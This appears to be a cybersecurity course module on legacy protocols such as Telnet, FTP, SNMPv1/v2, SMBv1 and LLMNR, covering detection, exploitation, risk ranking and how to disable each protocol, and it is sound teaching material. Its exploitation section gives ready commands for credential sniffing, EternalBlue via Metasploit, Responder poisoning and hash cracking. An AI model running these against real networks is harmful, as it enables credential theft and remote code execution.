# Legacy Protocols

## Unit 3 - Topic 5 | Network Vulnerabilities

---

## Overview

**Legacy protocols** are outdated network protocols that lack modern security features like encryption and strong authentication. Despite being deprecated, they remain present on many networks and create significant attack surfaces.

---

## 1. Dangerous Legacy Protocols

| Protocol | Port | Vulnerability | Replacement |
|----------|:----:|--------------|-------------|
| **Telnet** | 23 | Cleartext credentials | SSH |
| **FTP** | 21 | Cleartext credentials | SFTP/SCP |
| **TFTP** | 69 | No authentication | SFTP |
| **HTTP** | 80 | Cleartext data | HTTPS |
| **SNMPv1/v2** | 161 | Cleartext community strings | SNMPv3 |
| **SMBv1** | 445 | EternalBlue RCE | SMBv3 |
| **NTLMv1** | — | Weak hashing | NTLMv2/Kerberos |
| **SSL 3.0** | — | POODLE attack | TLS 1.2+ |
| **TLS 1.0/1.1** | — | BEAST, CRIME attacks | TLS 1.2+ |
| **LLMNR** | 5355 | Credential capture | DNS |
| **NBT-NS** | 137 | Credential capture | DNS |
| **RPC/DCOM** | 135 | Remote exploitation | Disable |

---

## 2. Detecting Legacy Protocols

```bash
# === SCAN FOR LEGACY SERVICES ===
# Telnet:
nmap -p 23 --script telnet-ntlm-info target.com

# FTP:
nmap -p 21 --script ftp-anon target.com

# TFTP:
nmap -sU -p 69 target.com

# SNMP v1/v2:
snmpwalk -v1 -c public target.com
snmpwalk -v2c -c public target.com
# If either works → vulnerable legacy SNMP

# SMBv1:
nmap -p 445 --script smb-protocols target.com
# Shows: SMBv1, SMBv2, SMBv3 support

# Weak SSL/TLS:
nmap -p 443 --script ssl-enum-ciphers target.com
testssl.sh target.com
# Check for: SSLv3, TLS 1.0, TLS 1.1

# LLMNR/NBT-NS (listen for traffic):
sudo responder -I eth0 -A    # Analyze mode (passive)
# Shows LLMNR and NBT-NS requests on the network
```

---

## 3. Exploiting Legacy Protocols

```bash
# === TELNET CREDENTIAL CAPTURE ===
# Telnet sends passwords in cleartext
# Capture with: tcpdump, Wireshark, or Bettercap
sudo tcpdump -i eth0 port 23 -A
# Shows: username and password in plaintext!

# === FTP CREDENTIAL SNIFFING ===
sudo tcpdump -i eth0 port 21 -A
# USER admin
# PASS MyPassword123
# → Cleartext credentials captured!

# === SNMP COMMUNITY STRING ABUSE ===
# Read system information:
snmpwalk -v2c -c public target.com system
# If write community string found:
snmpset -v2c -c private target.com ...
# Can modify device configuration!

# === SMBv1 ETERNALBLUE ===
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS target.com
msf> exploit
# Remote code execution on unpatched SMBv1 systems

# === LLMNR POISONING ===
sudo responder -I eth0 -wrfv
# Captures NTLMv2 hashes from LLMNR/NBT-NS queries
# Crack with hashcat: hashcat -m 5600 hash.txt wordlist.txt
```

---

## 4. Legacy Protocol Risk Assessment

```
RISK ASSESSMENT MATRIX:

CRITICAL RISK (Remove/Replace Immediately):
├── Telnet → Replace with SSH
├── FTP (cleartext) → Replace with SFTP/SCP
├── SMBv1 → Disable, use SMBv3
├── LLMNR/NBT-NS → Disable via GPO
└── SNMPv1/v2 with default community → Upgrade to v3

HIGH RISK (Upgrade Soon):
├── TLS 1.0/1.1 → Enforce TLS 1.2+
├── NTLMv1 → Enforce NTLMv2 minimum
├── HTTP for sensitive data → Enforce HTTPS
└── TFTP → Replace with SFTP

MEDIUM RISK (Plan Migration):
├── Older SSH versions → Upgrade OpenSSH
├── Weak cipher suites → Update configuration
└── Legacy authentication protocols
```

---

## 5. Disabling Legacy Protocols

```bash
# === DISABLE SMBv1 (Windows) ===
# PowerShell:
Set-SmbServerConfiguration -EnableSMB1Protocol $false
# Or via Group Policy:
# Computer Config → Admin Templates → Network → Lanman Server

# === DISABLE LLMNR (Group Policy) ===
# Computer Config → Admin Templates → Network → DNS Client
# → Turn Off Multicast Name Resolution → Enabled

# === DISABLE NBT-NS ===
# Network adapter → IPv4 → Advanced → WINS tab
# → Disable NetBIOS over TCP/IP

# === ENFORCE TLS 1.2+ (Apache) ===
# SSLProtocol -all +TLSv1.2 +TLSv1.3

# === ENFORCE TLS 1.2+ (nginx) ===
# ssl_protocols TLSv1.2 TLSv1.3;

# === UPGRADE SNMP TO v3 ===
# Configure SNMPv3 with authentication + encryption
# Disable SNMPv1 and SNMPv2c
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Telnet/FTP** | Cleartext credentials — use SSH/SFTP |
| **SMBv1** | EternalBlue RCE — disable immediately |
| **LLMNR/NBT-NS** | Credential capture via Responder |
| **SNMPv1/v2** | Cleartext community strings |
| **TLS 1.0/1.1** | Multiple attacks — enforce 1.2+ |
| **Defense** | Disable legacy, enforce modern alternatives |

---

## Quick Revision Questions

1. **Why are legacy protocols dangerous?**
2. **What replaces Telnet and FTP?**
3. **How is SMBv1 exploited?**
4. **What does Responder capture from LLMNR/NBT-NS?**
5. **How do you disable SMBv1 on Windows?**

---

[← Previous: Misconfigurations](04-misconfigurations.md) | [Next: Vulnerability Databases →](06-vulnerability-databases.md)

---

*Unit 3 - Topic 5 of 6 | [Back to README](../README.md)*
